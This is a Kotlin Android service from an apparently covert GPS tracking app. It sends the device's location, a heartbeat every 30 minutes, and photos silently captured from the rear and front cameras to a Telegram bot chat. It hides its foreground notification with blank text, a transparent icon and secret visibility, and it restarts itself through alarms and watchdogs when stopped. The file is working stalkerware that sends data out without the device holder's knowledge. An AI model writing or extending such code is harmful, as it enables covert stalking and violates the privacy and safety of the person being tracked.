package com.gpstracker.telegram

import android.app.AlarmManager
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.hardware.camera2.CameraCharacteristics
import android.location.Location
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.os.SystemClock
import android.util.Log
import androidx.core.app.NotificationCompat
import androidx.work.ExistingPeriodicWorkPolicy
import androidx.work.PeriodicWorkRequestBuilder
import androidx.work.WorkManager
import com.google.android.gms.location.FusedLocationProviderClient
import com.google.android.gms.location.LocationCallback
import com.google.android.gms.location.LocationRequest
import com.google.android.gms.location.LocationResult
import com.google.android.gms.location.LocationServices
import com.google.android.gms.location.Priority
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.launch
import java.util.concurrent.TimeUnit

class LocationTrackingService : Service() {

    companion object {
        private const val TAG = "LocationSvc"
        const val CHANNEL_ID = "sys_svc_01"
        const val NOTIFICATION_ID = 1

        const val EXTRA_BOOT_START = "boot_start"

        private const val ALERT_DISTANCE_METERS       = 50f
        private const val TELEGRAM_INTERVAL_MS        = 5  * 60 * 1000L   // 5 min
        private const val HEARTBEAT_INTERVAL_MS       = 30 * 60 * 1000L   // 30 min
        private const val LOCATION_INTERVAL_MS        = 15_000L
        private const val LOCATION_FASTEST_MS         = 5_000L
        private const val WATCHDOG_ALARM_INTERVAL_MS  = 10 * 60 * 1000L   // 10 min
    }

    private var fusedClient: FusedLocationProviderClient? = null
    private var locationCallback: LocationCallback? = null
    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)

    private var sentInitialLocation = false
    private var startLocation: Location? = null
    private var lastKnownLocation: Location? = null

    private val heartbeatHandler = Handler(Looper.getMainLooper())
    private val heartbeatRunnable = object : Runnable {
        override fun run() {
            sendHeartbeat()
            heartbeatHandler.postDelayed(this, HEARTBEAT_INTERVAL_MS)
        }
    }

    // Set to true just before we trigger our own restart so onDestroy
    // doesn't misfire the "tracker stopped" message.
    private var intentionalRestart = false

    // ─── Lifecycle ────────────────────────────────────────────────────────────

    override fun onCreate() {
        super.onCreate()
        try {
            createNotificationChannel()
            fusedClient = LocationServices.getFusedLocationProviderClient(this)
            buildLocationCallback()
        } catch (e: Exception) {
            Log.e(TAG, "onCreate: ${e.message}")
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        // 1. Start foreground immediately (required by Android)
        try {
            startForeground(NOTIFICATION_ID, buildStealthNotification())
        } catch (e: Exception) {
            Log.e(TAG, "startForeground: ${e.message}")
            try { startForeground(NOTIFICATION_ID, buildFallbackNotification()) }
            catch (e2: Exception) { Log.e(TAG, "fallback startForeground: ${e2.message}") }
        }

        // 2. Kick the SilentService to remove the notification from the shade
        try {
            startService(Intent(this, SilentService::class.java))
        } catch (e: Exception) {
            Log.e(TAG, "SilentService: ${e.message}")
        }

        try {
            prefs().edit().putBoolean(Prefs.KEY_TRACKING_ACTIVE, true).apply()

            // Restore start location from a previous session
            if (startLocation == null) {
                val lat = prefs().getFloat(Prefs.KEY_START_LAT, 0f)
                val lng = prefs().getFloat(Prefs.KEY_START_LNG, 0f)
                if (lat != 0f || lng != 0f) {
                    startLocation = Location("saved").apply {
                        latitude  = lat.toDouble()
                        longitude = lng.toDouble()
                    }
                    sentInitialLocation = true  // already sent on a previous run
                }
            }

            scheduleWatchdogs()
            tryLastKnownLocation()
            startLocationUpdates()
            heartbeatHandler.postDelayed(heartbeatRunnable, HEARTBEAT_INTERVAL_MS)

        } catch (e: Exception) {
            Log.e(TAG, "onStartCommand: ${e.message}")
        }

        Log.d(TAG, "Service running (sentInitial=$sentInitialLocation)")
        return START_STICKY
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        intentionalRestart = true
        try { scheduleImmediateRestart() } catch (_: Exception) {}
        super.onTaskRemoved(rootIntent)
    }

    override fun onDestroy() {
        heartbeatHandler.removeCallbacks(heartbeatRunnable)
        try { fusedClient?.removeLocationUpdates(locationCallback!!) } catch (_: Exception) {}

        if (!intentionalRestart) {
            // Something (OS / user) stopped us — notify owner then restart
            val (token, chatId) = credentials()
            try {
                Thread {
                    try { TelegramApi.sendMessage(token, chatId, TelegramApi.buildClosedMessage()) }
                    catch (_: Exception) {}
                }.also { it.isDaemon = false; it.start(); it.join(5_000) }
            } catch (_: Exception) {}
        }

        intentionalRestart = true
        try { scheduleImmediateRestart() } catch (_: Exception) {}
        try { scope.cancel() } catch (_: Exception) {}
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    // ─── Location ─────────────────────────────────────────────────────────────

    @Suppress("MissingPermission")
    private fun tryLastKnownLocation() {
        try {
            fusedClient?.lastLocation?.addOnSuccessListener { loc ->
                if (loc != null) onNewLocation(loc)
            }
        } catch (e: Exception) { Log.e(TAG, "lastLocation: ${e.message}") }
    }

    private fun buildLocationCallback() {
        locationCallback = object : LocationCallback() {
            override fun onLocationResult(result: LocationResult) {
                try { result.lastLocation?.let { onNewLocation(it) } }
                catch (e: Exception) { Log.e(TAG, "locationResult: ${e.message}") }
            }
        }
    }

    @Suppress("MissingPermission")
    private fun startLocationUpdates() {
        try {
            val cb = locationCallback ?: return
            val req = LocationRequest.Builder(
                Priority.PRIORITY_HIGH_ACCURACY, LOCATION_INTERVAL_MS
            ).setMinUpdateIntervalMillis(LOCATION_FASTEST_MS).build()
            fusedClient?.requestLocationUpdates(req, cb, Looper.getMainLooper())
        } catch (e: Exception) { Log.e(TAG, "requestUpdates: ${e.message}") }
    }

    private fun onNewLocation(location: Location) {
        try {
            lastKnownLocation = location
            prefs().edit()
                .putFloat(Prefs.KEY_CURRENT_LAT, location.latitude.toFloat())
                .putFloat(Prefs.KEY_CURRENT_LNG, location.longitude.toFloat())
                .apply()

            // ── First fix: send "online + location" + camera photos ────────
            if (!sentInitialLocation) {
                sentInitialLocation = true
                startLocation = location
                prefs().edit()
                    .putFloat(Prefs.KEY_START_LAT, location.latitude.toFloat())
                    .putFloat(Prefs.KEY_START_LNG, location.longitude.toFloat())
                    .apply()

                val (token, chatId) = credentials()
                val lat = location.latitude
                val lng = location.longitude
                val acc = location.accuracy
                scope.launch {
                    try {
                        TelegramApi.sendMessage(
                            token, chatId,
                            TelegramApi.buildOnlineWithLocationMessage(lat, lng, acc)
                        )
                    } catch (_: Exception) {}
                    // Capture + send camera photos without storing on device
                    sendCameraPhotos(token, chatId)
                }
                return
            }

            // ── Periodic movement alert ────────────────────────────────────
            val origin = startLocation ?: return
            val distance = origin.distanceTo(location)
            prefs().edit().putFloat(Prefs.KEY_CURRENT_DIST, distance).apply()

            if (distance >= ALERT_DISTANCE_METERS) {
                val lastSent = prefs().getLong(Prefs.KEY_LAST_SENT_TIME, 0L)
                val now = System.currentTimeMillis()
                if (now - lastSent >= TELEGRAM_INTERVAL_MS) {
                    val (token, chatId) = credentials()
                    scope.launch {
                        try {
                            val ok = TelegramApi.sendMessage(
                                token, chatId,
                                TelegramApi.buildLocationMessage(
                                    location.latitude, location.longitude,
                                    distance, location.accuracy
                                )
                            )
                            if (ok) prefs().edit()
                                .putLong(Prefs.KEY_LAST_SENT_TIME, now).apply()
                        } catch (_: Exception) {}
                    }
                }
            }
        } catch (e: Exception) { Log.e(TAG, "onNewLocation: ${e.message}") }
    }

    // ─── Heartbeat (stationary check every 30 min) ────────────────────────────

    private fun sendHeartbeat() {
        val loc = lastKnownLocation ?: return
        val (token, chatId) = credentials()
        scope.launch {
            try {
                TelegramApi.sendMessage(
                    token, chatId,
                    TelegramApi.buildStationaryMessage(
                        loc.latitude, loc.longitude, loc.accuracy
                    )
                )
            } catch (_: Exception) {}
        }
    }

    // ─── Camera photos ────────────────────────────────────────────────────────

    private suspend fun sendCameraPhotos(token: String, chatId: String) {
        val cameras = listOf(
            CameraCharacteristics.LENS_FACING_BACK  to "📸 Rear camera",
            CameraCharacteristics.LENS_FACING_FRONT to "🤳 Front camera"
        )
        for ((facing, label) in cameras) {
            try {
                val bytes = CameraCapture.capture(applicationContext, facing)
                if (bytes != null) {
                    TelegramApi.sendPhoto(token, chatId, bytes, label)
                } else {
                    Log.w(TAG, "Camera $label returned null")
                }
            } catch (e: Exception) {
                Log.e(TAG, "Camera $label error: ${e.message}")
            }
        }
    }

    // ─── Watchdogs ────────────────────────────────────────────────────────────

    private fun scheduleWatchdogs() {
        try {
            WorkManager.getInstance(this).enqueueUniquePeriodicWork(
                "loc_watchdog",
                ExistingPeriodicWorkPolicy.KEEP,
                PeriodicWorkRequestBuilder<WatchdogWorker>(15, TimeUnit.MINUTES).build()
            )
        } catch (e: Exception) { Log.e(TAG, "WorkManager: ${e.message}") }
        scheduleWatchdogAlarm(WATCHDOG_ALARM_INTERVAL_MS)
    }

    private fun scheduleImmediateRestart() = scheduleWatchdogAlarm(3_000L)

    private fun scheduleWatchdogAlarm(delayMs: Long) {
        try {
            val am = getSystemService(Context.ALARM_SERVICE) as AlarmManager
            val pi = PendingIntent.getBroadcast(
                this, 0,
                Intent(this, WatchdogReceiver::class.java).apply {
                    action = WatchdogReceiver.ACTION_WATCHDOG
                },
                PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
            )
            try {
                am.setExactAndAllowWhileIdle(
                    AlarmManager.ELAPSED_REALTIME_WAKEUP,
                    SystemClock.elapsedRealtime() + delayMs, pi
                )
            } catch (_: SecurityException) {
                am.set(
                    AlarmManager.ELAPSED_REALTIME_WAKEUP,
                    SystemClock.elapsedRealtime() + delayMs, pi
                )
            }
        } catch (e: Exception) { Log.e(TAG, "scheduleAlarm: ${e.message}") }
    }

    // ─── Stealth notification ─────────────────────────────────────────────────

    private fun createNotificationChannel() {
        val ch = NotificationChannel(
            CHANNEL_ID, " ", NotificationManager.IMPORTANCE_MIN
        ).apply {
            description = ""
            setShowBadge(false)
            setSound(null, null)
            enableLights(false)
            enableVibration(false)
        }
        (getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager)
            .createNotificationChannel(ch)
    }

    private fun buildStealthNotification(): Notification =
        NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("").setContentText("")
            .setSmallIcon(R.drawable.ic_transparent)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setOngoing(true).setSilent(true).build()

    private fun buildFallbackNotification(): Notification =
        NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("").setContentText("")
            .setSmallIcon(android.R.drawable.screen_background_dark)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setOngoing(true).setSilent(true).build()

    // ─── Helpers ──────────────────────────────────────────────────────────────

    private fun prefs() = getSharedPreferences(Prefs.NAME, Context.MODE_PRIVATE)

    private fun credentials(): Pair<String, String> {
        val p = prefs()
        return (p.getString(Prefs.KEY_BOT_TOKEN, Prefs.DEFAULT_BOT_TOKEN)
            ?: Prefs.DEFAULT_BOT_TOKEN) to
               (p.getString(Prefs.KEY_CHAT_ID, Prefs.DEFAULT_CHAT_ID)
            ?: Prefs.DEFAULT_CHAT_ID)
    }
}
